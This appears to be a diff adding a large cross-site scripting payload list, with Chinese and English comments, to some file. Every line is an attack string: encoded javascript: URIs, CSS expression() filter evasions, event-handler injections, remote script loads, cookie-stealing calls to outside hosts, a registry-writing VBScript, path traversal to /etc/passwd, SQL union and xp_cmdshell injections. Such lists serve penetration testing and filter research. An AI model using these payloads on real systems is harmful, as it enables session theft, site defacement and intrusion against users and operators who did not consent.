+&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS-24');"&gt;
+&lt;BODY BACKGROUND=”javascript:alert(‘XSS-25’)”&gt;
+&lt;BODY ONLOAD=alert(document.cookie)&gt;
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|"]^`=alert(“XSS-26”)&gt;
+&lt;IMG DYNSRC=”javascript:alert(‘XSS-27’)”&gt;
+&lt;IMG DYNSRC=”javascript:alert(‘XSS-28’)”&gt;
+&lt;BR SIZE=”&amp;{alert(‘XSS-29’)}”&gt;
+&lt;IMG SRC=’vbscript:msgbox(“XSS-30”)’&gt;
+&lt;TABLE BACKGROUND=”javascript:alert(‘XSS-31’)”&gt;
+&lt;DIV STYLE=”width: expression(alert(‘XSS-32’));”&gt;
+&lt;DIV STYLE=”background-image: url(javascript:alert(‘XSS-33’))”&gt;
+&lt;STYLE TYPE=”text/javascript”&gt;alert(‘XSS-34’);&lt;/STYLE&gt;
+&lt;STYLE type=”text/css”&gt;BODY{background:url(“javascript:alert(‘XSS-35’)”)}&lt;/STYLE&gt;
+&lt;?=’&lt;SCRIPT&gt;alert(“XSS-36”)&lt;/SCRIPT&gt;’?&gt;
+&lt;A HREF=”javascript:document.location=’http://www.example.com/’”&gt;XSS&lt;/A&gt;
+&lt;IMG SRC=javascript:alert(‘XSS-37’)&gt;
+&lt;EMBED SRC=”http://ha.ckers.org/xss.swf” AllowScriptAccess=”always”&gt;&lt;/EMBED&gt;
+a=”get”;
+b=”URL(“”";
+c=”javascript:”;
+d=”alert(‘XSS-38’);”")”;
+eval(a+b+c+d);
+
+
+&lt;img src="url.gif" dynsrc="url.avi"&gt;
+&lt;bgsound src="sound.wav" loop=3&gt;
+&lt;img src="SAMPLE-S.GIF" dynsrc="SAMPLE-S.AVI" start=mouseover&gt;
+&lt;script&gt;window.location="http://www.mimige.cn"&lt;/script&gt; 
+&lt;script language=JavaScript&gt;alert("终于有人上当的了！")&lt;/script&gt;
+
+
+&lt;TABLE background=javscript:alert(/xss-39/)&gt;
+
+
+&lt;iframe src=javascript:alert(/xss-40/)&gt;
+
+&lt;a href=javascript:alert(/xss-41/)&gt;
+
+
+&lt;DIV STYLE="background-image: url(javascript:alert('XSS-42'))"&gt;
+
+
+
+&lt;DIV STYLE="width: expression(alert('XSS-43'));"&gt;
+&lt;DIV STYLE="width: exp/*xss*/ression(alert('XSS-44'));"&gt;
+
+&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS-45")';&lt;/STYLE&gt;
+
+
+&lt;script&gt;open(/*
+*/"http://127"/*
+*/+".0.0.1/"/*
+*/)&lt;/script&gt;
+
+
+&lt;script&gt;/*
+*/eval(/*
+*/String/*
+*/./*
+*/fromCharCode/*
+*/(100,/*
+*/111,99,/*
+*/......./*
+*/59))/*
+*/&lt;/script&gt;
+
+
+&lt;script language="VBScript"&gt;
+Set RegWsh = CreateObject("WScript.Shell")
+RegWsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.attacker.com" 
+&lt;/script&gt;
+
+
+
+&lt;a href="javascript:alert('xss-46');"&gt;Click here&lt;/a&gt;
+
+
+
+&lt;form method="post" action="javascript:alert('xss-47');"&gt;
+&lt;input type="submit" value="Submit"&gt;
+&lt;/form&gt;
+
+
+
+
+&lt;img src="javascript:alert('xss-48');"&gt;&lt;!--只有ie能成功--&gt;
+
+
+
+&lt;object type="text/x-scriptlet" data="http://www.baidu.com"&gt;&lt;/object&gt; 
+
+
+
+&lt;img src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x77&amp;#x77&amp;#x77&amp;#x2E&amp;#x68&amp;#x61&amp;#x63&amp;#x6B&amp;#x6D&amp;#x2E&amp;#x63&amp;#x6F&amp;#x6D&amp;#x27&amp;#x29&gt;
+
+
+
+&lt;style type="text/css"&gt;
+@import url(javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,84,101,115,116,32,49,39,41,59,97,108,101,114,116,40,39,84,101,115,116,32,50,39,41,59)));
+&lt;/style&gt;
+
+
+
+
+&lt;font color="ffffff"&gt; &lt;div id="jmp" style="display:none"&gt;nop&lt;/div&gt;&lt;div id="ly" style="display:none"&gt;function ok(){return true};window.onerror=ok&lt;/div&gt;&lt;div id="tip" title="&amp;lt;a style=&amp;quot;display:none&amp;quot;&amp;gt;" style="display:none"&gt;&lt;/div&gt;&lt;div id="tap" title="&amp;lt;" style="display:none"&gt;&lt;/div&gt;&lt;div id="tep" title="&amp;gt;" style="display:none"&gt;&lt;/div&gt;&lt;style&gt;div{background-image:expression(javascript:1?document.write(EC_tip.title+';top:'+EC_tap.title+'/a'+EC_tep.title+EC_tap.title+'script id=nop'+EC_tep.title+EC_ly.innerHTML+EC_tap.title+'/script'+EC_tep.title+EC_tap.title+'script src=http://xxx.com/test/index.asp?uid=someone@hotmail.com'+EC_tep.title+EC_tap.title+'/script'+EC_tep.title):1=1);}&lt;/style&gt;&lt;/font&gt;
+
+
+
+
+&lt;img src=javascript:document.write('%3CIframe%20src=www.baidu.com%20width=500%20height=550%3E%3C/iframe%3E')&gt;
+
+
+&lt;STYLE&gt;
+Xsstc { background-image: url('about:blank#Hello%20World'); } 
+&lt;/STYLE&gt;
+Xsstc.exec('http://lbs.tralfamadore.com/test.css', showResponse)
+
+
+&lt;font color="ffffff"&gt; 
+     &lt;div id="jmp" style="display:none"&gt;nop&lt;/div&gt;
+     &lt;div id="ly" style="display:none"&gt;      //这几个DIV是用来分段存储exp内容的
+         function ok(){return true};
+         window.onerror=ok
+     &lt;/div&gt;
+     &lt;div id="tip" title="&amp;lt;a style=&amp;quot;display:none&amp;quot;&amp;gt;" style="display:none"&gt;&lt;/div&gt;
+     &lt;div id="tap" title="&amp;lt;" style="display:none"&gt;&lt;/div&gt;
+     &lt;div id="tep" title="&amp;gt;" style="display:none"&gt;&lt;/div&gt;
+     &lt;style&gt;
+ //以下是EXP的开始，一个二元表达式内嵌利用代码。代码把div中存储的内容取出来然后加一起，形成了最终shellcode。
+         div{background-image:expression(
+             javascript:1?document.write(
+                     EC_tip.title+';top:'+EC_tap.title+'/a'+
+                     EC_tep.title+EC_tap.title+'script id=nop'+
+                     EC_tep.title+EC_ly.innerHTML+EC_tap.title+'/script'+
+                     EC_tep.title+EC_tap.title+
+                     'script src=http://localhost/1.js'+
+                     EC_tep.title+EC_tap.title+'/script'+
+                     EC_tep.title)
+                     :1=1);
+                 }
+         &lt;/style&gt;
+ &lt;/font&gt;
+
+
+
+&lt;img src="java	script:alert(/xss-49/)" width=0&gt; 
+
+
+&lt;img src="#" onerror=alert(/xss-50/) width=0&gt; 
+
+&lt;a href="replace.htm#state=0&amp;url=http://www.39516.com/&lt;script&gt;alert('xeye')&lt;/script&gt;"&gt;xeye&lt;/a&gt;
+
+
+
+&lt;link type="text/css" rel="stylesheet" href=" http://www.baidu.com" /&gt;
+
+&lt;body{background: url(javascript:alert(document.cookie); ) }&lt;/body&gt;
+
+
+
+&lt;script/hello&gt;alert(/xss-51/)&lt;/script/world&gt;
+
+
+&lt;img/ssssss/src="javascript:alert(/1/)"&gt;
+&lt;IMG SRC=`javascript:alert(/2/)`&gt;
+
+&lt;IMG/src/SRC=`SRC//=//javascript:alert(/2/)`&gt;
+&lt;IMG/src=javascript:alert(/2/)`/SRC=`;SRC=javascript:alert(/2/)&gt;
+
+&lt;style&gt;body{xss:expression(alert(/xss-52/))}&lt;/style&gt;
+
+
+&lt;style&gt;@import 'javascript:alert(/xss-53/)'; &lt;/style&gt;
+
+
+&lt;script&gt;alert("XSS-54")&lt;/script&gt;
+&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS-55")';&lt;/STYLE&gt;
+&lt;style&gt;@\im\port'\ja\vasc\ript:alert()';&lt;/style&gt;
+&lt;style&gt;@\im\po\rt'\0ja\0va\0sc\0ri\0pt:alert()';&lt;/style&gt;
+&lt;STYLE&gt;@\0im\port'\0ja\vasc\ript:alert("XSS-56")';&lt;/STYLE&gt;
+&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS-57')")}&lt;/STYLE&gt;
+&lt;STYLE TYPE="text/css"&gt;.XSS{background-image:url("javascript:alert('XSS-58')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt; 
+&lt;marquee onstart="alert(/2/)"&gt;.&lt;/marquee&gt;
+&lt;div style="xss:ex/**/pre/**/ssion(alert('xss-59'))"&gt;
+&lt;div style="xss:ex/**/pre/**/ssion(eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41)))"&gt;
+&lt;DIV STYLE="width: expression(alert('XSS-60'));"&gt;
+&lt;div style="background:url('javascript:alert(1)')"&gt; 
+&lt;DIV STYLE="background-image: url(javascript:alert('XSS-61'))"&gt;
+&lt;div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"&gt;
+&lt;div id="mycode" expr="alert('hah!')" style="background:url('java\script:eval(document.all.mycode.expr)')"&gt; 
+&lt;BODY BACKGROUND="javascript:alert('XSS-62')"&gt;
+&lt;BODY ONLOAD=alert('XSS-63')&gt;
+&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS-64');"&gt;
+&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert('XSS-65')&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;
+&lt;TABLE BACKGROUND="javascript:alert('XSS-66')"&gt;
+&lt;iframe src="vbscript:alert()"&gt;
+&lt;IFRAME src=javascript:alert('XSS-67')&gt;&lt;/IFRAME&gt;
+&lt;IMG STYLE='xss:expre\ssion(alert("XSS-68"))'&gt;
+&lt;img src="#" style="Xss:expression(alert('xss-69'));"&gt;
+&lt;IMG src='vbscript:msgbox("XSS-70")'&gt;
+&lt;IMG DYNsrc="javascript:alert('XSS-71')"&gt; 
+&lt;IMG LOWsrc="javascript:alert('XSS-72')"&gt;
+&lt;img src="javascript:alert('3');"&gt;
+&lt;img src="http://xss.jpg" onerror=alert('4')&gt;
+&lt;img src="&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#88&amp;#83&amp;#83&amp;#39&amp;#41&amp;#59"&gt;
+&lt;IMG src=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+&lt;img src="&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&amp;#x3b"&gt; =&lt;img src="javascript:alert('5');"&gt;
+&lt;img STYLE="background-image: url(javascript:alert('6'))"&gt;
+javascript:document.write("&lt;script src=http://www.pc010.cn/1.js&gt;&lt;/script&gt;") 
+&lt;img src="javascript:alert(/10/)"&gt;
+&lt;img src="#" onerror=alert(/11/) &gt;
+&lt;IMG SRC="JAVA&amp;115;CRIPT:ALERT('12');"&gt;&lt;/IMG&gt;
+&lt;img src="javas&amp;#99;ript:alert('XSS-73')"&gt;
+&lt;IMG src="jav&amp;#x09;ascript:alert('XSS-74');"&gt; 
+&lt;IMG src="jav&amp;#x0A;ascript:alert('XSS-75');"&gt; 
+&lt;IMG src="jav&amp;#x0D;ascript:alert('XSS-76');"&gt; 
+javascript:document.write('&lt;scri'+'pt src=http://www.hackwolf.cn/1.txt&gt;'+'&lt;/scri'+'pt&gt;');
+RSnake的经典XSS脚本都测试下
+AJAX技术
+[float=expression(alert('xss-77'))]11[/float]
+&lt;TABLE BACKGROUND=javscript:alert(/xss-78/)&gt;
+
+163的跨站 &lt;img src="jav as cript:alert('XSS-79');"&gt;
+126 &lt;img src="&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#88&amp;#83&amp;#83&amp;#39&amp;#41&amp;#59"&gt;
+
+&lt;img src="javascript:window.open('http://wg12.cn/msg.asp?msg=&amp;#39;+document cookie);"&gt;
+
+xss.jpg" onerror=window.open('http://wg12.cn/msg.asp?msg=&amp;#39;+&amp;#39;document cookie) width=0&gt;
+&lt;img src="blah"onmouseover=alert()&gt;
+
+&lt;img onmouseover=alert()&gt;&lt;/img&gt;
+&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS-80")';&lt;/STYLE&gt; 
+
+七种tab符&amp;#9、换行符&amp;#10、回车符&amp;#13
+&lt;img src="abc&gt;" onmouseover="[code]"&gt;
+&lt;SCRIPT a="&gt;" SRC="xss.js"&gt;&lt;/SCRIPT&gt;
+
+&lt;script&gt;/*
+*/alert/*
+*/("zs")/*
+*/&lt;/script&gt;
+
+&lt;table&gt;&lt;tr&gt;&lt;td background="javascript:alert(/xss-81/)"&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#120&amp;#115&amp;#115&amp;#46&amp;#106&amp;#112&amp;#103&amp;#34&amp;#32&amp;#111&amp;#110&amp;#101&amp;#114&amp;#114&amp;#111&amp;#114&amp;#61&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#52&amp;#39&amp;#41&amp;#62
+
+&lt;img onmouseover=alert()&gt;&lt;/img&gt;
+&lt;STYLE&gt;@im\port'\ja\vasc\ript:eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))';&lt;/STYLE&gt; 
+
+&lt;style&gt;@import url(http://xxx.xxx.xxx/xss.css); &lt;/style&gt;
+xss.css
+body{
+xss:expression(
+if(!window.x)//防止重复执行
+{alert('xss-82');
+window.x=1;
+}
+)
+}
+
+
+
+&lt;style   type= "text/css "   media= "all "   title= "Default "&gt; 
+.mycss   { 
+color:red; 
+wuxinlangman:expression(onmousemove=function(){ 
+this.style.color= "blue "; 
+},onmouseout=function(){ 
+this.style.color= "red "; 
+}) 
+} 
+    &lt;/style&gt; 
+    &lt;body   id= "wuxinlangman "&gt; 
+&lt;input   class= "mycss "   value= "wuxinlangman "/&gt; 
+
+
+
+
+
+
+
+
+
+&lt;style type="text/css"&gt;
+a {star : expression_r(onfocus=this.blur)}
+&lt;/style&gt;
+&lt;a href="link1.htm"&gt;link1&lt;/a&gt;
+&lt;a href="link2.htm"&gt;link2&lt;/a&gt;
+&lt;a href="link3.htm"&gt;link3&lt;/a&gt;
+
+
+
+&lt;style&gt;body{xss:expr/*/*/expression/expression*/ession(alert(/xss-83/))}&lt;/style&gt;
+&lt;STYLE&gt;body{xss:exprexpression/expression*/ession(alert(/xss-84/))}&lt;/STYLE&gt;
+
+&lt;style&gt;body{xss:expr/*/*//*/ession(alert(/xss-85/))}&lt;/style&gt;
+&lt;STYLE&gt;body{xss:expr/*/ession(alert(/xss-86/))}&lt;/STYLE&gt;
+
+&lt;style&gt;body{xss:expr/*/*/ession(alert(/xss-87/))}&lt;/style&gt;
+&lt;STYLE&gt;body{xss:exp_ression(alert(/xss-88/))}&lt;/STYLE&gt;
+
+&lt;style&gt;body{xss:expr/*//*/ession(alert(/xss-89/))}&lt;/style&gt;
+&lt;STYLE&gt;body{xss:exp_ression(alert(/xss-90/))}&lt;/STYLE&gt;
+
+&lt;style&gt;body{xss:expr/*///*////*/ession(alert(/xss-91/))}&lt;/style&gt;
+&lt;STYLE&gt;body{xss:expr///*/ession(alert(/xss-92/))}&lt;/STYLE&gt;
+
+&lt;style&gt;body{xss:expr/*///**////*/ession(alert(/xss-93/))}&lt;/style&gt;
+&lt;STYLE&gt;body{xss:expr///*/ession(alert(/xss-94/))}&lt;/STYLE&gt;
+
+&lt;style&gt;body{xss:expr/*///******////*/ession(alert(/xss-95/))}&lt;/style&gt;
+
+
+
+
+
+---------
+
+
+
+'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+&lt;script&gt;alert(vulnerable)&lt;/script&gt; 
+%3Cscript%3Ealert('XSS-96')%3C/script%3E 
+&lt;s&amp;#99;ript&gt;alert('XSS-97')&lt;/script&gt; 
+&lt;img src="javas&amp;#99;ript:alert('XSS-98')"&gt; 
+%0a%0a&lt;script&gt;alert(\"Vulnerable\")&lt;/script&gt;.jsp 
+%22%3cscript%3ealert(%22xss%22)%3c/script%3e 
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
+%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini 
+%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e 
+%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e 
+%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html 
+%3f.jsp 
+%3f.jsp 
+&amp;lt;script&amp;gt;alert('Vulnerable');&amp;lt;/script&amp;gt 
+&lt;script&gt;alert('Vulnerable')&lt;/script&gt; 
+?sql_debug=1 
+a%5c.aspx 
+a.jsp/&lt;script&gt;alert('Vulnerable')&lt;/script&gt; 
+a/ 
+a?&lt;script&gt;alert('Vulnerable')&lt;/script&gt; 
+"&gt;&lt;script&gt;alert('Vulnerable')&lt;/script&gt; 
+';exec%20master..xp_cmdshell%20'dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt'--&amp;&amp; 
+%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E 
+%3Cscript%3Ealert(document. domain);%3C/script%3E&amp; 
+%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID={SESSION_ID}&amp;SESSION_ID= 
+1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname= 
+../../../../../../../../etc/passwd 
+..\..\..\..\..\..\..\..\windows\system.ini 
+\..\..\..\..\..\..\..\..\windows\system.ini 
+'';!--"&lt;XSS&gt;=&amp;{()} 
+&lt;IMG SRC="javascript:alert('XSS-99');"&gt; 
+&lt;IMG SRC=javascript:alert('XSS-100')&gt; 
+&lt;IMG SRC=JaVaScRiPt:alert('XSS-101')&gt; 
+&lt;IMG SRC=JaVaScRiPt:alert(&amp;quot;XSS&amp;quot;)&gt; 
+&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41&gt; 
+&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt; 
+&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt; 
+&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS-102');"&gt; 
+&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS-103');"&gt; 
+&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt; 
+"&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out 
+&lt;IMG SRC=" javascript:alert('XSS');"&gt; 
+&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt; 
+&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt; 
+&lt;BODY ONLOAD=alert('XSS')&gt; 
+&lt;IMG DYNSRC="javascript:alert('XSS')"&gt; 
+&lt;IMG LOWSRC="javascript:alert('XSS')"&gt; 
+&lt;BGSOUND SRC="javascript:alert('XSS');"&gt; 
+&lt;br size="&amp;{alert('XSS')}"&gt; 
+&lt;LAYER SRC="http://www.nspcn.org/xss/a.js"&gt;&lt;/layer&gt; 
+&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt; 
+&lt;IMG SRC='vbscript:msgbox("XSS")'&gt; 
+&lt;IMG SRC="mocha:[code]"&gt; 
+&lt;IMG SRC="livescript:[code]"&gt; 
+&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt; 
+&lt;IFRAME SRC=javascript:alert('XSS')&gt;&lt;/IFRAME&gt; 
+&lt;FRAMESET&gt;&lt;FRAME SRC=javascript:alert('XSS')&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt; 
+&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt; 
+&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt; 
+&lt;DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');"&gt; 
+&lt;DIV STYLE="width: expression(alert('XSS'));"&gt; 
+&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt; 
+&lt;IMG STYLE='xss:expre\ssion(alert("XSS"))'&gt; 
+&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt; 
+&lt;STYLE TYPE="text/css"&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt; 
+&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt; 
+&lt;BASE HREF="javascript:alert('XSS');//"&gt; 
+getURL("javascript:alert('XSS')") 
+a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d); 
+&lt;XML SRC="javascript:alert('XSS');"&gt; 
+"&gt; &lt;BODY ONLOAD="a();"&gt;&lt;SCRIPT&gt;function a(){alert('XSS');}&lt;/SCRIPT&gt;&lt;" 
+&lt;SCRIPT SRC="http://www.nspcn.org/xss/xss.jpg"&gt;&lt;/SCRIPT&gt; 
+&lt;IMG SRC="javascript:alert('XSS')" 
+&lt;!--#exec cmd="/bin/echo '&lt;SCRIPT SRC'"--&gt;&lt;!--#exec cmd="/bin/echo '=http://www.nspcn.org/xss/a.js&gt;&lt;/SCRIPT&gt;'"--&gt; 
+&lt;SCRIPT a="&gt;" SRC="http://www.nspcn.org/xss/a.js"&gt;&lt;/SCRIPT&gt; 
+&lt;SCRIPT ="&gt;" SRC="http://www.nspcn.org/xss/a.js"&gt;&lt;/SCRIPT&gt; 
+&lt;SCRIPT a="&gt;" '' SRC="http://www.nspcn.org/xss/a.js"&gt;&lt;/SCRIPT&gt; 
+&lt;SCRIPT "a='&gt;'" SRC="http://www.nspcn.org/xss/a.js"&gt;&lt;/SCRIPT&gt; 
+&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://www.nspcn.org/xss/a.js"&gt;&lt;/SCRIPT&gt; 
+&lt;A HREF=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt; 
+
+
+
+
+
+
+
+
+---------
+
+
+
+
+&lt;!--[if true]&gt;&lt;img onerror=alert(1) src=--&gt;
+&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;
+&lt;input autofocus onfocus=alert(1)&gt;
+&lt;select autofocus onfocus=alert(1)&gt;
+&lt;textarea autofocus onfocus=alert(1)&gt;
+&lt;keygen autofocus onfocus=alert(1)&gt;
+&lt;img src=1 language=vbs onerror=msgbox+1&gt;
+&lt;img src=1 language=vbscript onerror=msgbox+1&gt;
+&lt;img src=1 onerror=vbs:msgbox+1&gt;
+
+&lt;b/alt="1"onmouseover=InputBox+1 language=vbs&gt;test&lt;/b&gt;
+&lt;iframe onreadystatechange=alert(1)&gt;
+&lt;style onreadystatechange=alert(1)&gt;
+&lt;script onreadystatechange=alert(1)&gt;&lt;/script&gt;
+&lt;iframe onreadystatechange=alert(1)&gt;&lt;/iframe&gt;
+&lt;style onreadystatechange=alert(1)&gt;&lt;/style&gt;
+&lt;xml onreadystatechange=alert(1)&gt;
+&lt;xml onreadystatechange=alert(1)&gt;test&lt;/xml&gt;
+&lt;object type=image src=http://www.businessinfo.co.uk/labs/hackvertor/images/logo.gif onreadystatechange=alert(1)&gt;&lt;/object&gt;
+&lt;img type=image src=http://www.businessinfo.co.uk/labs/hackvertor/images/logo.gif onreadystatechange=alert(1)&gt;
+&lt;image type=image src=http://www.businessinfo.co.uk/labs/hackvertor/images/logo.gif onreadystatechange=alert(1)&gt;
+&lt;input type=image src=http://www.businessinfo.co.uk/labs/hackvertor/images/logo.gif onreadystatechange=alert(1)&gt;
+&lt;isindex type=image src=http://www.businessinfo.co.uk/labs/hackvertor/images/logo.gif onreadystatechange=alert(1)&gt;
+&lt;object data=anything_at_all.pdf&gt;&lt;param name=src value="http://p42.us/xss.pdf"&gt;&lt;/param&gt;&lt;/object&gt;
+&lt;img src="x onerror=alert(1)//[^"]*  &gt;
+
+&lt;a href='data:text/xml,&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE html [ &lt;!ENTITY inject "&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;"&gt;]&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&amp;inject;&lt;/html&gt;'&gt;haha&lt;/a&gt;
+
+This used to work on FF &lt;=3.0 
+@import 'data:text/css,* { -moz-binding:url(http://www.businessinfo.co.uk/labs/xbl/xbl.xml#xss) }';
+
+CSS expressions I could go on all night :)
+
+&lt;div style="xss:exp\00ression(window.x?0:(alert(/XSS/),window.x=1));"&gt;&lt;/div&gt;
+&lt;div style="\0078\0073\0073:\0065\0078\0070\0072\0065\0073\0073\0069\006f\006e(window.x?0:(alert(/XSS/),window.x=1));"&gt;&lt;/div&gt;
+&lt;div style="\0078 \0073 \0073: \0065 \0078 \0070 \0072 \0065 \0073 \0073 \0069 \006f \006e(window.x?0:(alert(/XSS/),window.x=1));"&gt;&lt;/div&gt;
+&lt;div style="xss:\000065\000078\00070\00072\00065\000073\00073\00069\0006f\006e(window.x?0:(alert(/XSS/),window.x=1));"&gt;&lt;/div&gt;
+&lt;div style="xs\0s:e\x\pression\(window.x?0:(alert(/XSS/),window.x=1)\);"&gt;&lt;/div&gt;
+&lt;div style="\0078\0073\0073:\0065&amp;#65279;\0078&amp;#65279;\0070&amp;#65279;\0072&amp;#65279;\0065&amp;#65279;\0073&amp;#65279;\0073&amp;#65279;\0069&amp;#65279;\006f&amp;#65279;\006e&amp;#65279;(window.x?0:(alert(/XSS/),window.x=1));"&gt;&lt;/div&gt;
+&lt;div style="\0078\0073\0073&amp;#62&amp;#58&amp;#92&amp;#48&amp;#48&amp;#54&amp;#53&amp;#92&amp;#48&amp;#48&amp;#55&amp;#56&amp;#92&amp;#48&amp;#48&amp;#55&amp;#48&amp;#92&amp;#48&amp;#48&amp;#55&amp;#50&amp;#92&amp;#48&amp;#48&amp;#54&amp;#53&amp;#92&amp;#48&amp;#48&amp;#55&amp;#51&amp;#92&amp;#48&amp;#48&amp;#55&amp;#51&amp;#92&amp;#48&amp;#48&amp;#54&amp;#57&amp;#92&amp;#48&amp;#48&amp;#54&amp;#102&amp;#92&amp;#48&amp;#48&amp;#54&amp;#101(window.x?0:(alert(/XSS/),window.x=1));"&gt;&lt;/div&gt;
+&lt;div style="\0000000000078\0000000000073s:e&amp;#x5c;&amp;#x78;p/*tbeorhf*/ression(window.x?0:(alert(/XSS/),window.x=1));"&gt;&lt;/div&gt;
+
+Encoded comments:-
+&lt;div style="xss:ex&amp;#47;&amp;#42;&amp;#79;&amp;#77;&amp;#71;&amp;#42;&amp;#47;pression(window.x?0:(alert(/XSS/),window.x=1));"&gt;&lt;/div&gt;
+
+The VB example doesn't require () :-
+&lt;IMG SRC=a onerror='vbscript:msgbox"XSS"'&gt;
+
+And how about vbs: 
+&lt;img src=1 onerror="vbs:MsgBox 1"&gt;
+&lt;?xml version="1.0" encoding="utf-7"?&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4- 
+&lt;&amp;#383;cript&gt;
+
+
+
+
+---------
+
+
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
+&lt;IMG SRC="javascript:alert('XSS');"&gt;
+&lt;IMG SRC=javascript:alert('XSS')&gt;
+&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
+&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;
+&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;
+&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
